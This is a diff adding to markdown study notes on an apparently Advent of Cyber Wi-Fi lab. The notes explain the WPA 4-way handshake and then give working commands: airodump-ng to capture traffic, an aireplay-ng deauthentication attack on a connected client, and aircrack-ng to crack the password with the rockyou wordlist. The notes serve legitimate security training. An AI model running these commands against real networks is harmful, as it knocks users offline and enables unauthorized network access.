@@ -29,6 +29,8 @@ access points (often the routers) that are broadcasting Wi-Fi signals with a uni
 
 The WPA 4-way handshake is a process that helps a client device (like your phone or laptop) and a Wi-Fi router confirm they both have the right "password" or Pre-Shared Key (PSK) before securely connecting.
 
+![[AoC-Day-11---Wifi-Animation-2.gif]]
+
 Here's a simplified rundown of what happens:
 - **Router sends a challenge:** The router (or access point) sends a challenge" to the client, asking it to prove it knows the network's password without directly sharing it.
 - **Client responds with encrypted information:** The client takes this challenge and uses the PSK to create an encrypted response that only the router can verify if it also has the correct PSK.
@@ -87,9 +89,7 @@ BSS 02:00:00:00:00:00(on wlan2)
 - The `Group and Pairwise ciphers` are **CCMP**. Counter Mode with Cipher Block Chaining Message Authentication Code Protocol (CCMP) is the encryption method used by WPA2.
 - The `Authentication suites` value inside RSN is **PSK** indicating that this is a WPA2-Personal network, where a shared password is used for authentication.
 - Another important detail is the `DS Parameter set` value, which shows **channel 6**. The channel, in terms of Wi-Fi, refers to a specific frequency range within the broader Wi-Fi spectrum that allows wireless devices to communicate with each other. There are various Wi-Fi channels, and they all help distribute network traffic across various frequency ranges, which reduces interference. The two most common Wi-Fi channels are 2.4 GHz and 5GHz. In the 2.4 GHz band, channels 1, 6, and 11 are commonly used because they don’t overlap, minimizing interference. In the 5 GHz band, there are many more channels available, allowing more networks to coexist without interference.
-
 #### Switching to monitor mode 
-
 
 ```shell
 glitch@wifi:~$ sudo ip link set dev wlan2 down # turn our device off
@@ -112,8 +112,26 @@ sudo airodump-ng wlan2 # provides a list of nearby Wi-Fi networks (SSIDs) and sh
 ```sh
 sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2 # This command targets the specific network channel and MAC address (BSSID) of the access point for which you want to capture the traffic
 ```
+goal of this command is to capture the 4-way handshake. It will first check for any clients that may be connected to the access point. If a client is already connected, then we can perform a deauthentication attack; otherwise, for any new client that connects, we will capture the 4-way handshake.
 
+2nd Terminal 
 
+We will launch the deauthentication attack. Because the client is already connected, we want to force them to reconnect to the access point, forcing it to send the handshake packets
+
+``` sh
+sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
+```
+- `-0` flag indicates that we are using the deauthentication attack,
+- `1` value is the number of deauths to send. 
+- `-a` indicates the BSSID of the access point 
+- `-c` indicates the BSSID of the client to deauthenticate.
+
+```sh
+sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
+```
+`-a 2` flag indicates the WPA/WPA2 attack mode
+
+> **Note:** If you get an `Packets contained no EAPOL data; unable to process this AP` error, this means that you ran aircrack-ng prior to the handshake being captured or that the handshake was not captured at all.
 
 
 ### References
